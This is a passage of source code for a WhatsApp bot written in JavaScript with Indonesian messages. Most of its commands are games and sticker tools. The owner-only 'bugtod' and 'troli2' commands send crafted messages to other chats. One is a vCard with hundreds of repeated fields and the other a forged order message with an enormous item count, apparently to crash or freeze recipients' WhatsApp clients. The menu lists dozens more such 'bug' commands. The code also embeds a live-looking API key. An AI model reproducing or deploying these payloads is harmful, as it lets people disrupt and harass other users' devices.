${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await anggazyy404.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await anggazyy404.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini┣❏➥ ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'bugtod': {
if (!isCreator) return

 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© Anggazyy 1981${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;anggazyy404;;;\nFN:Anggazyy 1981\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
anggazyy404.sendContact(m.chat, global.owner, fkontaak)
}
break
            case 'delttc': case 'delttt': {
            let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
            if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
            delete this.game[roomnya.id]
            m.reply(`Berhasil delete session room tictactoe !`)
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh :┣❏➥ ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await anggazyy404.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) anggazyy404.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
            case 'pinterest': {
let { pinterest } = require('./lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
anggazyy404.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: zyy })
}
break
//=================================================//
case 'couple': {
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
anggazyy404.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: zyy })
anggazyy404.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: zyy })
}
break
case 'setstatus': case 'setbiobot': case 'setbotbio': {
            	if (!isCreator) return
         	  if (!text) return m.reply(`this is a WhatsApp Bot named anggazyy404-Morou`)
        	   let name = await anggazyy404.updateProfileStatus(text)
           	m.reply(`Successfully changed bot bio status to ${name}`)
         	  }
           	break
			case 'setnamabot': case 'setnamebot': {
				if (!isCreator) return
        	   if (!text) return m.reply( `Example : ${prefix + command} WhatsApp ✅`)
       	    let name = await anggazyy404.updateProfileName(text)
        	   m.reply(`Successfully renamed bot to ${name}`)
      	     }
       	    break
case 'owner': case 'creator': {
                anggazyy404.sendContact(m.chat, global.owner, m)
            }
            break
case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
                   case 'setppbot': {
                if (!isCreator) return
                if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                let media = await anggazyy404.downloadAndSaveMediaMessage(qmsg)
                await anggazyy404.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply('done')
                }
                break
//============= Convert File Massage
case 'sticker': case 's': case 'stickergif': case 'sgif': {
           if (/image/.test(mime)) {
           m.reply(mess.wait)
                let media = await anggazyy404.downloadMediaMessage(qmsg)
                let encmedia = await anggazyy404.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
            m.reply(mess.wait)
                if (qmsg.seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await anggazyy404.downloadMediaMessage(qmsg)
                let encmedia = await anggazyy404.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                m.reply(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Video/Gif 1-9 Detik`)
                }
            }
            break
            case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': {
                let [teks1, teks2] = text.split`|`
                if (!teks1) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
                if (!teks2) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
            	m.reply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await anggazyy404.downloadMediaMessage(qmsg)
                    let encmedia = await anggazyy404.sendImageAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                    let media = await anggazyy404.downloadMediaMessage(qmsg)
                    let encmedia = await anggazyy404.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else {
                    throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
            case 'anggaq':
            m.reply('so asik kontol') 
            m.reply('apasih')
            break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await anggazyy404.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'doge':
case 'dogestick':{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await anggazyy404.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'bucinstick':
case 'bucinp' :{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await anggazyy404.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break

case 'patrik':
case 'patrick': {
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await anggazyy404.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
            case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await anggazyy404.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    case 'emojimix2': {
	    if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await anggazyy404.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	       case 'attp': case 'ttp': {
           if (!text) throw `Example : ${prefix + command} text`
           await anggazyy404.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'anggazyy404', 'morou', m, {asSticker: true})

         }
         break
            case 'troli2': {
if (!isCreator) return
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "449756950375071",
"itemCount": 99999999999,	
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© Anggazyy 1981${ngazap(prefix)}`,
"jpegThumbnail": mekih,
"orderTitle": `© Anggazyy 1981${ngazap(prefix)}`,
"sellerJid": "50767666664@s.whatsapp.net",
"token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",	
}
}), { userJid: m.chat, quoted: doc })
anggazyy404.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
case 'setsponsor':
			case 'setiklan':
				if (!isCreator) return
				if (args.length < 1) return m.reply('text nya mana')
				let intex = q.split('|')[0] ? q.split('|')[0]: q
				let expr = q.split('|')[1] ? q.split('|')[1]: ''
				exo = Date.now() + toMs(expr)
				newvalue = {
  				setting: intex,
  				expired: exo
				}
				oldvalue = jsn[0].setting
				let position = false
				Object.keys(jsn).forEach((i) => {
  				if (jsn[i].setting === oldvalue) {
    				position = i
  				}
				})
				if (position !== false) {
  				jsn[position] = newvalue
  				fs.writeFileSync('./images/database.json', JSON.stringify(jsn))
				}
				m.reply(`Iklan sukses diganti menjadi : *${jsn[0].setting}*`)
				break
	       case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        m.reply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await anggazyy404.downloadMediaMessage(qmsg)
	        let { floNime } = require('./lib/uploader')
	        let fatGans = await floNime(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
	        let FaTiH = await anggazyy404.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	       break
            case 'toimage': case 'toimg': {
                if (!/webp/.test(mime)) throw `Reply sticker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await anggazyy404.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    anggazyy404.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
            case 'get': {
if (!args[0]) return m.reply("Urlnya?")
if (!isUrl(text)) return m.reply("Hanya Link!")
try {
let gts = await fetchJson(args.join(" "))
m.reply(gts)
} catch {
m.reply("Error!")
}
}
break

            case 'help':
            case 'menu': {
     footerr = `Peringatan : Dilarang spam command/apapun ke bot!, dikarena mengakibatkan bot eror!\n© 2022 anggazyy`
				anu = `Hallo Saya Anggazyy Bot

Information bot🔐
Name bot : *${namabotz}*
Owner name : *${namaowner}*
Lib : *Baileys*
Status : *Online*
Running with : *${runvia}*
Runtime : *${runtime(os.uptime())}*

 *OTHER*
┣❏➥ ${prefix}tictactoe @tag
┣❏➥ ${prefix}afk
┣❏➥ ${prefix}anticall on
┣❏➥ ${prefix}anticall off
┣❏➥ ${prefix}nowa
┣❏➥ ${prefix}msk
┣❏➥ ${prefix}getcase
┣❏➥ ${prefix}get 
┣❏➥ ${prefix}setppbot
┣❏➥ ${prefix}setbio
┣❏➥ ${prefix}owner

 *FUN*
┣❏➥ ${prefix}confes
┣❏➥ ${prefix}menfes

 *CONVERTED*
┣❏➥ ${prefix}sticker
┣❏➥ ${prefix}emojimix
┣❏➥ ${prefix}emojimix2 
┣❏➥ ${prefix}stickmeme  <text>| <text>
┣❏➥ ${prefix}ttp <text>
┣❏➥ ${prefix}attp <text>
┣❏➥ ${prefix}toimage
┣❏➥ ${prefix}dbinary
┣❏➥ ${prefix}ebinary
┣❏➥ ${prefix}tovideo
┣❏➥ ${prefix}pinterest
┣❏➥ ${prefix}couple

 *RANDOM*
┣❏➥ ${prefix}patrick
┣❏➥ ${prefix}dogestick
┣❏➥ ${prefix}bucinstick
┣❏➥ ${prefix}gurastick

 *BUG*
┣❏➥ ${prefix}butto
┣❏➥ ${prefix}stikto
┣❏➥ ${prefix}catalogbug
┣❏➥ ${prefix}bugvn
┣❏➥ ${prefix}bugdoc
┣❏➥ ${prefix}momo
┣❏➥ ${prefix}momoto
┣❏➥ ${prefix}gasmomo
┣❏➥ ${prefix}gasinfinite
┣❏➥ ${prefix}infinite
┣❏➥ ${prefix}infiniteto
┣❏➥ ${prefix}gassantet
┣❏➥ ${prefix}santet
┣❏➥ ${prefix}santetto
┣❏➥ ${prefix}bugkon
┣❏➥ ${prefix}buglokas
┣❏➥ ${prefix}troli2
┣❏➥ ${prefix}bug1
┣❏➥ ${prefix}bug2
┣❏➥ ${prefix}bug3
┣❏➥ ${prefix}bug4
┣❏➥ ${prefix}bug5
┣❏➥ ${prefix}bug6
┣❏➥ ${prefix}bug7
┣❏➥ ${prefix}lokas
┣❏➥ ${prefix}docuwalz1
┣❏➥ ${prefix}docuwalz2
┣❏➥ ${prefix}docuwalz3
┣❏➥ ${prefix}docuwalz4
┣❏➥ ${prefix}poll
┣❏➥ ${prefix}santetdia
┣❏➥ ${prefix}gaswalz
┣❏➥ ${prefix}ampas1
┣❏➥ ${prefix}ampas2
┣❏➥ ${prefix}pengsui
┣❏➥ ${prefix}bugie
┣❏➥ ${prefix}bugbctext
┣❏➥ ${prefix}bugbokep
┣❏➥ ${prefix}hiya
┣❏➥ ${prefix}santetgc
┣❏➥ ${prefix}ha 
┣❏➥ ${prefix}hi
┣❏➥ ${prefix}hu
┣❏➥ ${prefix}vhe
┣❏➥ ${prefix}ba
┣❏➥ ${prefix}be
┣❏➥ ${prefix}bu
┣❏➥ ${prefix}bi
┣❏➥ ${prefix}ci
┣❏➥ ${prefix}cu 
┣❏➥ ${prefix}co


*Changelogs :*
Added ${snt[4]}
Added ${snt[3]}
Added ${snt[2]}
Added ${snt[1]}
Added ${snt[0]}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
`,

btn = [{
                                urlButton: {
                                    displayText: 'ꜰᴏʟʟᴏᴡ ɪɴꜱᴛᴀɢʀᴀᴍ',
                                    url: 'https://instagram.com/fdhlgrphy'
                                }
                            }, {
                                urlButton: {
                                    displayText: 'ɢʀᴏᴜᴘ ᴡʜᴀᴛꜱᴀᴘᴘ',
                                    url: 'https://chat.whatsapp.com/KX1gNmG96RHC2oUlNy3Wdz'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '❗ ᴄʀᴇᴅɪᴛ',
                                    id: 'credit'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '👤 ᴏᴡɴᴇʀ',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: '[ɴᴇᴡ] ᴄᴏɴꜰᴇꜱꜱ',
                                    id: 'menfes'
                                }
                            }]

